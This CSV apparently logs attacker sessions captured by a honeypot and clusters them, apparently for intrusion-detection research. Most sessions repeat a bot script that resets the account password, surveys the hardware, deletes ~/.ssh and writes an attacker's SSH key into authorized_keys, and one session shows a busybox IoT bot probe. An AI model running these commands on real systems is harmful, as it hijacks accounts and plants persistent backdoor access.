session,SeededKmeans_result,Unnamed: 0,duration,command_freq,input
41fb113baa09,1,11564,17.496796131134033,18,"echo -e ""123\n00x8ZuIRE52O\n00x8ZuIRE52O""|passwd|bash"
41fb113baa09,1,11565,17.496796131134033,18,Enter new UNIX password: 
41fb113baa09,1,11566,17.496796131134033,18,Enter new UNIX password:
41fb113baa09,1,11567,17.496796131134033,18,"echo ""123\n00x8ZuIRE52O\n00x8ZuIRE52O\n""|passwd"
41fb113baa09,1,11568,17.496796131134033,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
41fb113baa09,1,11569,17.496796131134033,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
41fb113baa09,1,11570,17.496796131134033,18,ls -lh $(which ls)
41fb113baa09,1,11571,17.496796131134033,18,which ls
41fb113baa09,1,11572,17.496796131134033,18,crontab -l
41fb113baa09,1,11573,17.496796131134033,18,w
41fb113baa09,1,11574,17.496796131134033,18,uname -m
41fb113baa09,1,11575,17.496796131134033,18,cat /proc/cpuinfo | grep model | grep name | wc -l
41fb113baa09,1,11576,17.496796131134033,18,top
41fb113baa09,1,11577,17.496796131134033,18,uname
41fb113baa09,1,11578,17.496796131134033,18,uname -a
41fb113baa09,1,11579,17.496796131134033,18,lscpu | grep Model
41fb113baa09,1,11580,17.496796131134033,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
5244995eb5c3,1,11581,18.73811650276184,18,cat /proc/cpuinfo | grep name | wc -l
5244995eb5c3,1,11582,18.73811650276184,18,"echo -e ""password\nJxNdx7GFfmLD\nJxNdx7GFfmLD""|passwd|bash"
5244995eb5c3,1,11583,18.73811650276184,18,Enter new UNIX password: 
5244995eb5c3,1,11584,18.73811650276184,18,Enter new UNIX password:
5244995eb5c3,1,11585,18.73811650276184,18,"echo ""password\nJxNdx7GFfmLD\nJxNdx7GFfmLD\n""|passwd"
5244995eb5c3,1,11586,18.73811650276184,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
5244995eb5c3,1,11587,18.73811650276184,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
5244995eb5c3,1,11588,18.73811650276184,18,ls -lh $(which ls)
5244995eb5c3,1,11589,18.73811650276184,18,which ls
5244995eb5c3,1,11590,18.73811650276184,18,crontab -l
5244995eb5c3,1,11591,18.73811650276184,18,w
5244995eb5c3,1,11592,18.73811650276184,18,uname -m
5244995eb5c3,1,11593,18.73811650276184,18,cat /proc/cpuinfo | grep model | grep name | wc -l
5244995eb5c3,1,11594,18.73811650276184,18,top
5244995eb5c3,1,11595,18.73811650276184,18,uname
5244995eb5c3,1,11596,18.73811650276184,18,uname -a
5244995eb5c3,1,11597,18.73811650276184,18,lscpu | grep Model
5244995eb5c3,1,11598,18.73811650276184,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
05bc04e2116d,1,11599,15.40793752670288,18,cat /proc/cpuinfo | grep name | wc -l
05bc04e2116d,1,11600,15.40793752670288,18,"echo -e ""123456\n7AIyvMqEExSb\n7AIyvMqEExSb""|passwd|bash"
05bc04e2116d,1,11601,15.40793752670288,18,Enter new UNIX password: 
05bc04e2116d,1,11602,15.40793752670288,18,Enter new UNIX password:
05bc04e2116d,1,11603,15.40793752670288,18,"echo ""123456\n7AIyvMqEExSb\n7AIyvMqEExSb\n""|passwd"
05bc04e2116d,1,11604,15.40793752670288,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
05bc04e2116d,1,11605,15.40793752670288,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
05bc04e2116d,1,11606,15.40793752670288,18,ls -lh $(which ls)
05bc04e2116d,1,11607,15.40793752670288,18,which ls
05bc04e2116d,1,11608,15.40793752670288,18,crontab -l
05bc04e2116d,1,11609,15.40793752670288,18,w
05bc04e2116d,1,11610,15.40793752670288,18,uname -m
05bc04e2116d,1,11611,15.40793752670288,18,cat /proc/cpuinfo | grep model | grep name | wc -l
05bc04e2116d,1,11612,15.40793752670288,18,top
05bc04e2116d,1,11613,15.40793752670288,18,uname
05bc04e2116d,1,11614,15.40793752670288,18,uname -a
05bc04e2116d,1,11615,15.40793752670288,18,lscpu | grep Model
05bc04e2116d,1,11616,15.40793752670288,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
140b5870a4d7,1,11617,16.047693967819214,18,cat /proc/cpuinfo | grep name | wc -l
140b5870a4d7,1,11618,16.047693967819214,18,"echo -e ""evan\nPwhOwQcvNYgp\nPwhOwQcvNYgp""|passwd|bash"
140b5870a4d7,1,11619,16.047693967819214,18,Enter new UNIX password: 
140b5870a4d7,1,11620,16.047693967819214,18,Enter new UNIX password:
140b5870a4d7,1,11621,16.047693967819214,18,"echo ""evan\nPwhOwQcvNYgp\nPwhOwQcvNYgp\n""|passwd"
140b5870a4d7,1,11622,16.047693967819214,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
140b5870a4d7,1,11623,16.047693967819214,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
140b5870a4d7,1,11624,16.047693967819214,18,ls -lh $(which ls)
140b5870a4d7,1,11625,16.047693967819214,18,which ls
140b5870a4d7,1,11626,16.047693967819214,18,crontab -l
140b5870a4d7,1,11636,16.047693967819214,18,w
140b5870a4d7,1,11644,16.047693967819214,18,uname -m
140b5870a4d7,1,11647,16.047693967819214,18,cat /proc/cpuinfo | grep model | grep name | wc -l
140b5870a4d7,1,11648,16.047693967819214,18,top
140b5870a4d7,1,11649,16.047693967819214,18,uname
140b5870a4d7,1,11650,16.047693967819214,18,uname -a
140b5870a4d7,1,11651,16.047693967819214,18,lscpu | grep Model
140b5870a4d7,1,11652,16.047693967819214,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
8a5d4b0dee34,1,11627,4.238013029098511,18,cat /proc/cpuinfo | grep name | wc -l
8a5d4b0dee34,1,11628,4.238013029098511,18,"echo -e ""warehouse\n3jhGOFtym53B\n3jhGOFtym53B""|passwd|bash"
8a5d4b0dee34,1,11629,4.238013029098511,18,Enter new UNIX password: 
8a5d4b0dee34,1,11630,4.238013029098511,18,Enter new UNIX password:
8a5d4b0dee34,1,11631,4.238013029098511,18,"echo ""warehouse\n3jhGOFtym53B\n3jhGOFtym53B\n""|passwd"
8a5d4b0dee34,1,11632,4.238013029098511,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
8a5d4b0dee34,1,11633,4.238013029098511,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
8a5d4b0dee34,1,11634,4.238013029098511,18,ls -lh $(which ls)
8a5d4b0dee34,1,11635,4.238013029098511,18,which ls
8a5d4b0dee34,1,11637,4.238013029098511,18,crontab -l
8a5d4b0dee34,1,11638,4.238013029098511,18,w
8a5d4b0dee34,1,11639,4.238013029098511,18,uname -m
8a5d4b0dee34,1,11640,4.238013029098511,18,cat /proc/cpuinfo | grep model | grep name | wc -l
8a5d4b0dee34,1,11641,4.238013029098511,18,top
8a5d4b0dee34,1,11642,4.238013029098511,18,uname
8a5d4b0dee34,1,11643,4.238013029098511,18,uname -a
8a5d4b0dee34,1,11645,4.238013029098511,18,lscpu | grep Model
8a5d4b0dee34,1,11646,4.238013029098511,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
69fc8d87203a,1,11653,12.06882905960083,18,cat /proc/cpuinfo | grep name | wc -l
69fc8d87203a,1,11654,12.06882905960083,18,"echo -e ""12345\nl4NABjjs6brp\nl4NABjjs6brp""|passwd|bash"
69fc8d87203a,1,11655,12.06882905960083,18,Enter new UNIX password: 
69fc8d87203a,1,11656,12.06882905960083,18,Enter new UNIX password:
69fc8d87203a,1,11657,12.06882905960083,18,"echo ""12345\nl4NABjjs6brp\nl4NABjjs6brp\n""|passwd"
69fc8d87203a,1,11658,12.06882905960083,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
69fc8d87203a,1,11659,12.06882905960083,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
69fc8d87203a,1,11660,12.06882905960083,18,ls -lh $(which ls)
69fc8d87203a,1,11661,12.06882905960083,18,which ls
69fc8d87203a,1,11662,12.06882905960083,18,crontab -l
69fc8d87203a,1,11663,12.06882905960083,18,w
69fc8d87203a,1,11664,12.06882905960083,18,uname -m
69fc8d87203a,1,11665,12.06882905960083,18,cat /proc/cpuinfo | grep model | grep name | wc -l
69fc8d87203a,1,11666,12.06882905960083,18,top
69fc8d87203a,1,11667,12.06882905960083,18,uname
69fc8d87203a,1,11668,12.06882905960083,18,uname -a
69fc8d87203a,1,11669,12.06882905960083,18,lscpu | grep Model
69fc8d87203a,1,11670,12.06882905960083,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
5e37dfe5749c,0,11671,8.217082738876343,13,enable
5e37dfe5749c,0,11672,8.217082738876343,13,system
5e37dfe5749c,0,11673,8.217082738876343,13,system
5e37dfe5749c,0,11674,8.217082738876343,13,shell
5e37dfe5749c,0,11675,8.217082738876343,13,shell
5e37dfe5749c,0,11676,8.217082738876343,13,sh
5e37dfe5749c,0,11677,8.217082738876343,13,cat /proc/mounts; /bin/busybox XXMAZ
5e37dfe5749c,0,11678,8.217082738876343,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox XXMAZ
5e37dfe5749c,0,11679,8.217082738876343,13,tftp; wget; /bin/busybox XXMAZ
5e37dfe5749c,0,11680,8.217082738876343,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
5e37dfe5749c,0,11681,8.217082738876343,13,while read i
5e37dfe5749c,0,11682,8.217082738876343,13,/bin/busybox XXMAZ
5e37dfe5749c,0,11683,8.217082738876343,13,rm .s; exit
00fde5d4fa37,1,11684,15.313203573226929,18,cat /proc/cpuinfo | grep name | wc -l
00fde5d4fa37,1,11685,15.313203573226929,18,"echo -e ""123456\ng8ukNZ23kGL4\ng8ukNZ23kGL4""|passwd|bash"
00fde5d4fa37,1,11686,15.313203573226929,18,Enter new UNIX password: 
00fde5d4fa37,1,11687,15.313203573226929,18,Enter new UNIX password:
00fde5d4fa37,1,11688,15.313203573226929,18,"echo ""123456\ng8ukNZ23kGL4\ng8ukNZ23kGL4\n""|passwd"
00fde5d4fa37,1,11689,15.313203573226929,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
00fde5d4fa37,1,11690,15.313203573226929,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
00fde5d4fa37,1,11691,15.313203573226929,18,ls -lh $(which ls)
00fde5d4fa37,1,11692,15.313203573226929,18,which ls
00fde5d4fa37,1,11693,15.313203573226929,18,crontab -l
00fde5d4fa37,1,11694,15.313203573226929,18,w
00fde5d4fa37,1,11695,15.313203573226929,18,uname -m
00fde5d4fa37,1,11696,15.313203573226929,18,cat /proc/cpuinfo | grep model | grep name | wc -l
00fde5d4fa37,1,11697,15.313203573226929,18,top
00fde5d4fa37,1,11698,15.313203573226929,18,uname
00fde5d4fa37,1,11699,15.313203573226929,18,uname -a
00fde5d4fa37,1,11700,15.313203573226929,18,lscpu | grep Model
00fde5d4fa37,1,11701,15.313203573226929,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
a61da8ca0db9,1,11702,19.47252297401428,18,cat /proc/cpuinfo | grep name | wc -l
a61da8ca0db9,1,11703,19.47252297401428,18,"echo -e ""modem\nPg3wX658IEGB\nPg3wX658IEGB""|passwd|bash"
a61da8ca0db9,1,11704,19.47252297401428,18,Enter new UNIX password: 
a61da8ca0db9,1,11705,19.47252297401428,18,Enter new UNIX password:
a61da8ca0db9,1,11706,19.47252297401428,18,"echo ""modem\nPg3wX658IEGB\nPg3wX658IEGB\n""|passwd"
a61da8ca0db9,1,11707,19.47252297401428,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
a61da8ca0db9,1,11708,19.47252297401428,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
a61da8ca0db9,1,11709,19.47252297401428,18,ls -lh $(which ls)
a61da8ca0db9,1,11710,19.47252297401428,18,which ls
a61da8ca0db9,1,11711,19.47252297401428,18,crontab -l
a61da8ca0db9,1,11712,19.47252297401428,18,w
a61da8ca0db9,1,11713,19.47252297401428,18,uname -m
a61da8ca0db9,1,11714,19.47252297401428,18,cat /proc/cpuinfo | grep model | grep name | wc -l
a61da8ca0db9,1,11715,19.47252297401428,18,top
a61da8ca0db9,1,11716,19.47252297401428,18,uname
a61da8ca0db9,1,11717,19.47252297401428,18,uname -a
a61da8ca0db9,1,11718,19.47252297401428,18,lscpu | grep Model
a61da8ca0db9,1,11719,19.47252297401428,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
75e137e23d9f,1,11720,15.467267990112305,18,cat /proc/cpuinfo | grep name | wc -l
75e137e23d9f,1,11721,15.467267990112305,18,"echo -e ""password\nCBf3Xyi5K3oK\nCBf3Xyi5K3oK""|passwd|bash"
75e137e23d9f,1,11722,15.467267990112305,18,Enter new UNIX password: 
75e137e23d9f,1,11723,15.467267990112305,18,Enter new UNIX password:
75e137e23d9f,1,11724,15.467267990112305,18,"echo ""password\nCBf3Xyi5K3oK\nCBf3Xyi5K3oK\n""|passwd"
75e137e23d9f,1,11725,15.467267990112305,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
75e137e23d9f,1,11726,15.467267990112305,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
75e137e23d9f,1,11727,15.467267990112305,18,ls -lh $(which ls)
75e137e23d9f,1,11728,15.467267990112305,18,which ls
75e137e23d9f,1,11729,15.467267990112305,18,crontab -l
75e137e23d9f,1,11730,15.467267990112305,18,w
75e137e23d9f,1,11731,15.467267990112305,18,uname -m
75e137e23d9f,1,11732,15.467267990112305,18,cat /proc/cpuinfo | grep model | grep name | wc -l
75e137e23d9f,1,11733,15.467267990112305,18,top
75e137e23d9f,1,11734,15.467267990112305,18,uname
75e137e23d9f,1,11735,15.467267990112305,18,uname -a
75e137e23d9f,1,11736,15.467267990112305,18,lscpu | grep Model
75e137e23d9f,1,11737,15.467267990112305,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
0d6f3fa3f654,1,11738,8.98194932937622,18,cat /proc/cpuinfo | grep name | wc -l
0d6f3fa3f654,1,11739,8.98194932937622,18,"echo -e ""rolland\nUNNagQHGLG2f\nUNNagQHGLG2f""|passwd|bash"
0d6f3fa3f654,1,11740,8.98194932937622,18,Enter new UNIX password: 
0d6f3fa3f654,1,11741,8.98194932937622,18,Enter new UNIX password:
0d6f3fa3f654,1,11742,8.98194932937622,18,"echo ""rolland\nUNNagQHGLG2f\nUNNagQHGLG2f\n""|passwd"
0d6f3fa3f654,1,11743,8.98194932937622,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
0d6f3fa3f654,1,11744,8.98194932937622,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
0d6f3fa3f654,1,11745,8.98194932937622,18,ls -lh $(which ls)
0d6f3fa3f654,1,11746,8.98194932937622,18,which ls
0d6f3fa3f654,1,11747,8.98194932937622,18,crontab -l
0d6f3fa3f654,1,11748,8.98194932937622,18,w
0d6f3fa3f654,1,11749,8.98194932937622,18,uname -m
0d6f3fa3f654,1,11750,8.98194932937622,18,cat /proc/cpuinfo | grep model | grep name | wc -l
0d6f3fa3f654,1,11751,8.98194932937622,18,top
0d6f3fa3f654,1,11752,8.98194932937622,18,uname
0d6f3fa3f654,1,11753,8.98194932937622,18,uname -a
0d6f3fa3f654,1,11754,8.98194932937622,18,lscpu | grep Model
0d6f3fa3f654,1,11755,8.98194932937622,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
6cb21999ee51,1,11756,15.762066841125488,18,cat /proc/cpuinfo | grep name | wc -l
6cb21999ee51,1,11757,15.762066841125488,18,"echo -e ""ykl\nTjrW5NXtginz\nTjrW5NXtginz""|passwd|bash"
6cb21999ee51,1,11758,15.762066841125488,18,Enter new UNIX password: 
6cb21999ee51,1,11759,15.762066841125488,18,Enter new UNIX password:
6cb21999ee51,1,11760,15.762066841125488,18,"echo ""ykl\nTjrW5NXtginz\nTjrW5NXtginz\n""|passwd"
6cb21999ee51,1,11761,15.762066841125488,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
6cb21999ee51,1,11762,15.762066841125488,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
6cb21999ee51,1,11763,15.762066841125488,18,ls -lh $(which ls)
6cb21999ee51,1,11764,15.762066841125488,18,which ls
6cb21999ee51,1,11765,15.762066841125488,18,crontab -l
6cb21999ee51,1,11766,15.762066841125488,18,w
6cb21999ee51,1,11767,15.762066841125488,18,uname -m
6cb21999ee51,1,11768,15.762066841125488,18,cat /proc/cpuinfo | grep model | grep name | wc -l
6cb21999ee51,1,11769,15.762066841125488,18,top
6cb21999ee51,1,11770,15.762066841125488,18,uname
6cb21999ee51,1,11771,15.762066841125488,18,uname -a
6cb21999ee51,1,11772,15.762066841125488,18,lscpu | grep Model
6cb21999ee51,1,11773,15.762066841125488,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
c0a2391322e6,1,11774,20.86737370491028,18,cat /proc/cpuinfo | grep name | wc -l
c0a2391322e6,1,11775,20.86737370491028,18,"echo -e ""amoreno\nCDouXMsCUZD3\nCDouXMsCUZD3""|passwd|bash"
c0a2391322e6,1,11776,20.86737370491028,18,Enter new UNIX password: 
c0a2391322e6,1,11777,20.86737370491028,18,Enter new UNIX password:
c0a2391322e6,1,11778,20.86737370491028,18,"echo ""amoreno\nCDouXMsCUZD3\nCDouXMsCUZD3\n""|passwd"
c0a2391322e6,1,11779,20.86737370491028,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
c0a2391322e6,1,11780,20.86737370491028,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
c0a2391322e6,1,11781,20.86737370491028,18,ls -lh $(which ls)
c0a2391322e6,1,11782,20.86737370491028,18,which ls
c0a2391322e6,1,11783,20.86737370491028,18,crontab -l
c0a2391322e6,1,11784,20.86737370491028,18,w
c0a2391322e6,1,11785,20.86737370491028,18,uname -m
c0a2391322e6,1,11786,20.86737370491028,18,cat /proc/cpuinfo | grep model | grep name | wc -l
